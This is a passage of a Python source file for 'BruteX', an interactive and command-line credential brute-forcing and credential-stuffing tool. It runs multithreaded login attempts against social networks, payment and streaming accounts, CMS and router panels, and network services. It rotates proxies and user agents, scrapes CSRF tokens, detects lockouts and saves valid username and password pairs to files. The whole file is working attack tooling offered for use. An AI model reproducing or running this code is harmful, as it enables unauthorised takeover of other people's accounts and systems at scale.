    d = f" [{default}]" if default else ""
    v = input(f"{C}[?]{X} {prompt}{GR}{d}{X}: ").strip()
    return v if v else default


def _ask_int(prompt, default, lo, hi):
    while True:
        v = _ask(prompt, default)
        try:
            n = int(v)
            if lo <= n <= hi:
                return n
        except (TypeError, ValueError):
            pass
        print(f"{R}[!] Enter a number between {lo} and {hi}.{X}")


def _ask_yes(prompt, default=False):
    d = "y/N" if not default else "Y/n"
    v = input(f"{C}[?]{X} {prompt} [{d}]: ").strip().lower()
    if not v:
        return default
    return v in ("y", "yes", "1")


# ── WEB ENGINE ───────────────────────────────────────────────────────────────
class WebEngine:
    def __init__(self, cfg, plat):
        self.cfg = cfg
        self.plat = plat
        self.stats = ProgressStats()
        self.stop_flag = threading.Event()
        self.hits = []
        self.hits_lock = threading.Lock()
        self.host = cfg.get("host")
        self.proxies = self._load_proxies()
        self.proxy_idx = 0
        self.proxy_lock = threading.Lock()
        self.outfile = f"brutex_hits_{datetime.now():%Y%m%d_%H%M%S}.txt"

    def _load_proxies(self):
        pf = self.cfg.get("proxy_file")
        if not pf:
            return []
        out = []
        for line in _read_lines(pf):
            if "://" not in line:
                line = "http://" + line
            out.append(line)
        return out

    def _next_proxy(self):
        if not self.proxies:
            return None
        with self.proxy_lock:
            p = self.proxies[self.proxy_idx % len(self.proxies)]
            self.proxy_idx += 1
        return {"http": p, "https": p}

    def _session(self):
        s = requests.Session()
        retry = Retry(total=2, backoff_factor=0.3,
                      status_forcelist=(500, 502, 503, 504),
                      allowed_methods=("GET", "POST"))
        ad = HTTPAdapter(max_retries=retry, pool_connections=50, pool_maxsize=50)
        s.mount("http://", ad)
        s.mount("https://", ad)
        return s

    def _sub(self, v):
        if self.host is None:
            return v
        if isinstance(v, str):
            return v.replace("{HOST}", self.host)
        if isinstance(v, dict):
            return {k: self._sub(x) for k, x in v.items()}
        if isinstance(v, list):
            return [self._sub(x) for x in v]
        return v

    def _fetch_csrf(self, session):
        plat = self.plat
        if not plat.get("csrf_req"):
            return None
        url = self._sub(plat["csrf_url"])
        try:
            r = session.get(url, timeout=self.cfg.get("timeout", 25),
                            proxies=self._next_proxy(), allow_redirects=True,
                            headers={"User-Agent": random.choice(UA_LIST),
                                     "Accept": "text/html,*/*;q=0.8",
                                     "Accept-Language": "en-US,en;q=0.9"})
            rx = plat.get("regex")
            if rx and rx.startswith("header:"):
                return r.headers.get(rx.split(":", 1)[1], "")
            if rx:
                m = re.search(rx, r.text)
                if m:
                    return m.group(1)
            for pat in [r'csrfToken["\']?\s*[:=]\s*["\']([a-zA-Z0-9_\-]+)',
                        r'name="csrf_token"\s+value="([^"]+)"',
                        r'"csrf"\s*:\s*"([^"]+)"',
                        r'name="fb_dtsg"\s+value="([^"]+)"',
                        r'name="authenticity_token"\s+value="([^"]+)"']:
                m = re.search(pat, r.text)
                if m:
                    return m.group(1)
        except Exception:
            pass
        return None

    def _eval(self, r, spec):
        for item in spec:
            if isinstance(item, int):
                if r.status_code == item:
                    return True
            elif item in r.text or item in r.url:
                return True
        return False

    def _attempt(self, u, p):
        if self.stop_flag.is_set():
            return
        try:
            session = self._session()
            csrf = self._fetch_csrf(session)
            url = self._sub(self.plat["url"])
            m = re.match(r"https?://[^/]+", url)
            headers = dict(self.plat.get("headers") or {})
            headers.update({
                "User-Agent": random.choice(UA_LIST),
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.9",
                "Origin": m.group(0) if m else url,
                "Referer": self._sub(self.plat.get("referer") or url),
            })
            rx = self.plat.get("regex") or ""
            if csrf:
                hdr = rx.split(":", 1)[1] if rx.startswith("header:") else "X-CSRFToken"
                headers[hdr] = csrf
            payload = self._sub(self.plat["form"](u, p, csrf))
            delay = float(self.cfg.get("delay") or 0)
            if delay > 0:
                time.sleep(delay * random.random())
            if self.plat.get("json") and isinstance(payload, dict):
                r = session.request(self.plat.get("method", "POST"), url, json=payload,
                                    headers=headers, timeout=self.cfg.get("timeout", 25),
                                    proxies=self._next_proxy(),
                                    allow_redirects=not self.plat.get("noredir"))
            else:
                r = session.request(self.plat.get("method", "POST"), url, data=payload,
                                    headers=headers, timeout=self.cfg.get("timeout", 25),
                                    proxies=self._next_proxy(),
                                    allow_redirects=not self.plat.get("noredir"))
            if (self._eval(r, self.plat.get("lock", ())) or
                    "captcha" in r.text[:3000].lower() or
                    "too many" in r.text[:3000].lower()):
                self.stats.record("lock")
                print(f"{Y}[LOCK]{X} {u}", flush=True)
                return
            if self._eval(r, self.plat.get("ok", ())):
                self.stats.record("hit")
                with self.hits_lock:
                    self.hits.append((u, p, f"HTTP {r.status_code}"))
                print(f"{G}{BD}[HIT]{X}  {u}:{p}  {GR}(HTTP {r.status_code}){X}", flush=True)
                with open(self.outfile, "a") as f:
                    f.write(f"[{datetime.now():%Y-%m-%d %H:%M:%S}] {self.plat['name'].upper()} {u}:{p}\n")
                if self.cfg.get("stop_on_hit"):
                    self.stop_flag.set()
                return
            self.stats.record("fail")
        except requests.exceptions.RequestException:
            self.stats.record("err")
        except Exception:
            self.stats.record("err")


# ── NETWORK ENGINE ───────────────────────────────────────────────────────────
class NetEngine:
    def __init__(self, cfg, plat):
        self.cfg = cfg
        self.plat = plat
        self.stats = ProgressStats()
        self.stop_flag = threading.Event()
        self.hits = []
        self.hits_lock = threading.Lock()
        self.outfile = f"brutex_hits_{datetime.now():%Y%m%d_%H%M%S}.txt"

    def _attempt(self, u, p):
        if self.stop_flag.is_set():
            return
        host = self.cfg.get("host") or "127.0.0.1"
        port = int(self.cfg.get("port") or self.plat.get("port", 0))
        timeout = self.cfg.get("timeout", 25)
        tls = self.plat.get("default_tls", False)
        user = u if self.plat.get("needs_user", True) else ""
        try:
            res, info = self.plat["check"](host, port, user, p, timeout, tls)
        except Exception:
            res, info = "err", "exception"
        if res == "hit":
            self.stats.record("hit")
            with self.hits_lock:
                self.hits.append((u, p, f"{host}:{port} ({info})"))
            print(f"{G}{BD}[HIT]{X}  {u}:{p}  {GR}@{host}:{port}{X}  ({info})", flush=True)
            with open(self.outfile, "a") as f:
                f.write(f"[{datetime.now():%Y-%m-%d %H:%M:%S}] {self.plat['name'].upper()} {u}:{p} @ {host}:{port}\n")
            if self.cfg.get("stop_on_hit"):
                self.stop_flag.set()
        elif res == "lock":
            self.stats.record("lock")
            print(f"{Y}[LOCK]{X} {u} ({info})", flush=True)
        elif res == "err":
            self.stats.record("err")
        else:
            self.stats.record("fail")


# ── PROGRESS BAR ─────────────────────────────────────────────────────────────
def _progress_loop(stats, stop_flag, label):
    while not stop_flag.is_set():
        time.sleep(2)
        s = stats.snapshot()
        pct = (s["tried"] / s["total"] * 100) if s["total"] else 0
        bw = 22
        filled = int(bw * pct / 100)
        bar = "█" * filled + "░" * (bw - filled)
        sys.stdout.write(
            f"\r{C}{label}{X} {G}{bar}{X} {W}{pct:5.1f}%{X}  "
            f"tried:{W}{s['tried']}{X} {G}hit:{s['hits']}{X} "
            f"{R}fail:{s['fails']}{X} {Y}err:{s['errors']}{X} "
            f"{M}lock:{s['lockouts']}{X} {C}{s['rps']:.1f}/s{X}   ")
        sys.stdout.flush()
    print()


# ── REPORTS ──────────────────────────────────────────────────────────────────
def write_report(cfg, plat, stats, hits):
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    s = stats.snapshot()
    rep = {
        "tool": "BruteX", "version": APP_VERSION,
        "timestamp": datetime.now().isoformat(),
        "platform": plat["name"], "host": cfg.get("host"), "port": cfg.get("port"),
        "duration_s": round(s["elapsed"], 2), "tried": s["tried"],
        "hits": len(hits), "fails": s["fails"], "errors": s["errors"],
        "lockouts": s["lockouts"], "credentials": hits,
    }
    jf = f"brutex_report_{ts}.json"
    with open(jf, "w") as f:
        json.dump(rep, f, indent=2)
    return jf


# ── LAUNCHER ─────────────────────────────────────────────────────────────────
def launch(cfg, plat, pairs):
    total = len(pairs)
    engine = WebEngine(cfg, plat) if plat["kind"] == "web" else NetEngine(cfg, plat)
    engine.stats.total = total

    missing = [k for k, v in OPT.items() if not v]
    if plat["kind"] == "net" and missing:
        print(f"{Y}[i] Optional libs not installed: {', '.join(missing)}{X}")
        print(f"{Y}    pip install {' '.join(missing)}{X}")

    endpoint = cfg.get("host") or (plat.get("url", "") if plat["kind"] == "web" else f"tcp/{plat.get('port')}")
    lines = [f"{C}Platform:{X}  {BD}{plat['name'].upper()}{X}",
             f"{C}Endpoint:{X}  {GR}{endpoint}{X}",
             f"{C}Pairs:{X}    {BD}{total:,}{X}",
             f"{C}Threads:{X}   {BD}{cfg.get('threads', 25)}{X}",
             f"{C}Proxies:{X}   {BD}{len(engine.proxies)}{X}",
             f"{C}Smart:{X}     {BD}{'ON' if cfg.get('smart') else 'off'}{X}",
             f"{C}Output:{X}    {Y}{engine.outfile}{X}"]
    print("\n" + box("TARGET SUMMARY", lines))

    t = threading.Thread(target=_progress_loop,
                         args=(engine.stats, engine.stop_flag, plat["name"].upper()),
                         daemon=True)
    t.start()

    chunk = max(1, int(cfg.get("threads", 25)) * 4)
    try:
        with ThreadPoolExecutor(max_workers=int(cfg.get("threads", 25))) as ex:
            for i in range(0, total, chunk):
                batch = pairs[i:i + chunk]
                futs = [ex.submit(engine._attempt, u, p) for u, p in batch]
                for f in as_completed(futs):
                    if engine.stop_flag.is_set() and cfg.get("stop_on_hit"):
                        break
                if engine.stop_flag.is_set() and cfg.get("stop_on_hit"):
                    break
    except KeyboardInterrupt:
        engine.stop_flag.set()
        print(f"\n{R}[!] Interrupted by user.{X}")

    engine.stop_flag.set()
    time.sleep(1.0)

    s = engine.stats.snapshot()
    report = write_report(cfg, plat, engine.stats, engine.hits)
    slines = [f"Duration : {s['elapsed']:.1f}s",
              f"Tried    : {s['tried']:,}",
              f"{G}Hits     : {len(engine.hits)}{X}",
              f"Fails    : {s['fails']:,}",
              f"Errors   : {s['errors']}",
              f"Lockouts : {s['lockouts']}",
              f"Rate     : {s['rps']:.1f}/s",
              f"{Y}Report   : {report}{X}"]
    print("\n" + box("FINAL SUMMARY", slines, color=G))

    if engine.hits:
        print(f"\n{G}{BD}[+] VALID CREDENTIALS FOUND:{X}")
        for u, p, extra in engine.hits:
            print(f"  {G}►{X} {W}{u}{X}:{W}{p}{X}  {GR}{extra}{X}")
    else:
        print(f"\n{Y}[*] No valid credentials found in this batch.{X}")
    return engine.hits


# ── MENU SYSTEM ──────────────────────────────────────────────────────────────
CATEGORIES = [
    ("[ SOCIAL NETWORKS ]",
     ["instagram", "facebook", "twitter", "linkedin", "reddit", "tiktok",
      "snapchat", "github", "pinterest"]),
    ("[ EMAIL & ACCOUNTS ]",
     ["ebay", "netflix", "spotify", "paypal", "roblox"]),
    ("[ SELF-HOSTED - CMS / PANELS / ROUTERS ]",
     ["wordpress", "drupal", "joomla", "cpanel", "nextcloud",
      "phpmyadmin", "mikrotik", "pfsense"]),
    ("[ NETWORK SERVICES ]",
     sorted(NETPLATFORMS.keys())),
]


def pick_platform():
    while True:
        print(f"\n{M}{BD}┌─ PLATFORM SELECTION ─────────────────────────────┐{X}")
        idx = 1
        mapping = {}
        for title, names in CATEGORIES:
            print(f"{M}{BD}│{X} {C}{title}{X}")
            for n in names:
                mark = f" {Y}[experimental]{X}" if n in EXPERIMENTAL else ""
                print(f"{M}{BD}│{X}   {G}{idx:>2}.{X} {W}{n:<12}{X}{mark}")
                mapping[str(idx)] = n
                mapping[n] = n
                idx += 1
        print(f"{M}{BD}│{X}   {R} 0.{X} Back to main menu")
        print(f"{M}{BD}└──────────────────────────────────────────────────┘{X}")
        ch = input(f"{C}[?]{X} Number or name: ").strip().lower()
        if ch in ("0", ""):
            return None
        if ch in mapping:
            return mapping[ch]
        print(f"{R}[!] Unknown selection.{X}")


def setup_wizard(plat_name, cfg):
    plat = PLATFORMS.get(plat_name) or NETPLATFORMS.get(plat_name)
    cfg["platform"] = plat_name
    print(f"\n{BD}┌─ TARGET SETUP: {plat_name.upper()} ───────────────────────┐{X}")

    if plat["kind"] == "web":
        if plat.get("hosted"):
            host = _ask("Target host (IP or domain)", cfg.get("host"))
            if host and "://" not in host:
                host = ("http://" if plat_name == "mikrotik" else "https://") + host
            cfg["host"] = host
        else:
            cfg["host"] = None
        cfg["port"] = None
    else:
        cfg["host"] = _ask("Target host (IP/domain)", cfg.get("host") or "127.0.0.1")
        cfg["port"] = _ask_int("Port", cfg.get("port") or plat["port"], 1, 65535)

    print(f"\n{BD}┌─ CREDENTIAL MODE ───────────────────────────────────────┐{X}")
    print(f"  {G}1.{X} Single user + password list")
    print(f"  {G}2.{X} Combo file  (user:pass per line)")
    print(f"  {G}3.{X} User list × password list")
    mode = _ask_int("Mode", cfg.get("mode_num", 1), 1, 3)
    cfg["mode_num"] = mode

    if mode == 1:
        cfg["user"] = _ask("Username/email", cfg.get("user"))
        cfg["passlist"] = _ask("Password list file", cfg.get("passlist") or "rockyou.txt")
        cfg["combo"] = cfg["userlist"] = None
    elif mode == 2:
        cfg["combo"] = _ask("Combo file", cfg.get("combo"))
        cfg["user"] = cfg["userlist"] = cfg["passlist"] = None
    else:
        cfg["userlist"] = _ask("User list file", cfg.get("userlist"))
        cfg["passlist"] = _ask("Password list file", cfg.get("passlist"))
        cfg["user"] = cfg["combo"] = None

    print(f"\n{BD}┌─ ENGINE OPTIONS ───────────────────────────────────────┐{X}")
    cfg["threads"] = _ask_int("Threads", cfg.get("threads", 25), 1, 500)
    cfg["delay"] = float(_ask("Delay between requests (0 = none)", cfg.get("delay", 0)) or 0)
    cfg["timeout"] = _ask_int("Timeout seconds", cfg.get("timeout", 25), 3, 120)
    cfg["proxy_file"] = _ask("Proxy file (Enter = none)", cfg.get("proxy_file") or "") or None
    cfg["smart"] = _ask_yes("Smart password mutations", cfg.get("smart", False))
    cfg["stop_on_hit"] = _ask_yes("Stop on first hit", cfg.get("stop_on_hit", False))
    save_config()
    print(f"{G}[+] Configuration saved to {CONFIG_FILE}{X}")


def list_platforms():
    for title, names in CATEGORIES:
        print(f"\n{C}{BD}{title}{X}")
        for n in names:
            if n in PLATFORMS:
                p = PLATFORMS[n]
                print(f"  {G}▸{X} {W}{n:<12}{X} {GR}{p['url'].replace('{HOST}', '<HOST>')}{X}")
            else:
                p = NETPLATFORMS[n]
                print(f"  {G}▸{X} {W}{n:<12}{X} {GR}tcp/{p['port']}{X}")


def view_results():
    files = sorted(glob.glob("brutex_hits_*.txt"))
    if not files:
        print(f"{Y}[*] No results yet.{X}")
        return
    fn = files[-1]
    print(f"\n{BD}LAST RESULTS FILE: {fn}{X}")
    with open(fn) as f:
        data = f.read()
    print(data if data else f"{Y}(empty){X}")


def main_menu():
    while True:
        print(box("BRUTEX v4.0 PRO - MAIN MENU", [
            " 1.  RUN ATTACK      pick platform -> configure -> GO",
            " 2.  TARGET SETUP    choose platform & options only",
            " 3.  PLATFORM LIST   browse all 39 endpoints",
            " 4.  LOAD CONFIG     restore saved settings",
            " 5.  SAVE CONFIG     store current settings",
            " 6.  VIEW RESULTS    show latest hits file",
            " 7.  EXIT            quit BruteX",
        ], color=M))
        ch = _ask("Select [1-7]", "1")
        if ch == "1":
            name = pick_platform()
            if not name:
                continue
            plat = PLATFORMS.get(name) or NETPLATFORMS.get(name)
            if name in EXPERIMENTAL and not _ask_yes(f"{Y}{name} is bot-protected / version-dependent — continue?", False):
                continue
            setup_wizard(name, CFG)
            pairs = load_pairs(CFG)
            if not pairs:
                print(f"{R}[!] No credentials loaded — check your files.{X}")
                continue
            launch(CFG, plat, pairs)
        elif ch == "2":
            name = pick_platform()
            if name:
                setup_wizard(name, CFG)
        elif ch == "3":
            list_platforms()
        elif ch == "4":
            if load_config():
                print(f"{G}[+] Config loaded.{X}")
                print(f"    Platform: {W}{CFG.get('platform') or '-'}{X}  "
                      f"Host: {W}{CFG.get('host') or '-'}{X}  "
                      f"Threads: {W}{CFG.get('threads')}{X}")
            else:
                print(f"{Y}[*] No config found.{X}")
        elif ch == "5":
            print(f"{G}[+] Config saved to {CONFIG_FILE}{X}" if save_config() else f"{R}[!] Save failed.{X}")
        elif ch == "6":
            view_results()
        elif ch == "7":
            print(f"\n{G}[+] BruteX out. Stay authorized.{X}")
            break
        else:
            print(f"{R}[!] Invalid option.{X}")


# ── CLI (headless fallback) ──────────────────────────────────────────────────
def build_parser():
    p = argparse.ArgumentParser(
        prog="brutex",
        description=f"{R}{BD}BruteX v{APP_VERSION}{X} — {APP_TAGLINE}",
        formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("-p", "--platform", help="Target platform name")
    p.add_argument("--host", help="Target host (network services / self-hosted web)")
    p.add_argument("--port", type=int, help="Target port (network services)")
    p.add_argument("--combo", help="Combo file: user:pass per line")
    p.add_argument("-u", "--user", help="Single username")
    p.add_argument("-U", "--userlist", help="Username list file")
    p.add_argument("-P", "--passlist", help="Password list file")
    p.add_argument("-t", "--threads", type=int, default=25, help="Threads (default: 25)")
    p.add_argument("--proxy-file", help="Proxy list file")
    p.add_argument("--delay", type=float, default=0.0, help="Request jitter delay (s)")
    p.add_argument("--timeout", type=int, default=25, help="Request timeout (s)")
    p.add_argument("--stop-on-hit", action="store_true", help="Stop after first hit")
    p.add_argument("--smart", action="store_true", help="Smart password mutations")
    p.add_argument("--list-platforms", action="store_true", help="List platforms and exit")
    p.add_argument("--no-banner", action="store_true", help="Skip banner")
    return p


def main():
    args = build_parser().parse_args()
    if args.list_platforms:
        banner()
        list_platforms()
        return
    if not args.no_banner:
        banner()

    if not args.platform:
        print(f"\n{G}[*] No arguments — starting interactive MENU mode.{X}")
        try:
            main_menu()
        except KeyboardInterrupt:
            print(f"\n{R}[!] Bye.{X}")
        return

    CFG.update(platform=args.platform, host=args.host, port=args.port,
               combo=args.combo, user=args.user, userlist=args.userlist,
               passlist=args.passlist, threads=args.threads,
               proxy_file=args.proxy_file, delay=args.delay,
               timeout=args.timeout, stop_on_hit=args.stop_on_hit,
               smart=args.smart)
    plat = PLATFORMS.get(args.platform) or NETPLATFORMS.get(args.platform)
    if not plat:
        print(f"{R}[!] Unknown platform: {args.platform}{X}")
        print(f"    Use --list-platforms or run with no args for the menu.")
        return
    if plat["kind"] == "net" and not CFG["host"]:
        print(f"{R}[!] Network service needs --host (and optionally --port).{X}")
        return
    if plat["kind"] == "web" and plat.get("hosted") and not CFG["host"]:
        print(f"{R}[!] Self-hosted platform needs --host.{X}")
        return
    pairs = load_pairs(CFG)
    if not pairs:
        print(f"{R}[!] No credentials. Use --combo, -u/-P or -U/-P.{X}")
        return
    launch(CFG, plat, pairs)


if __name__ == "__main__":
    main()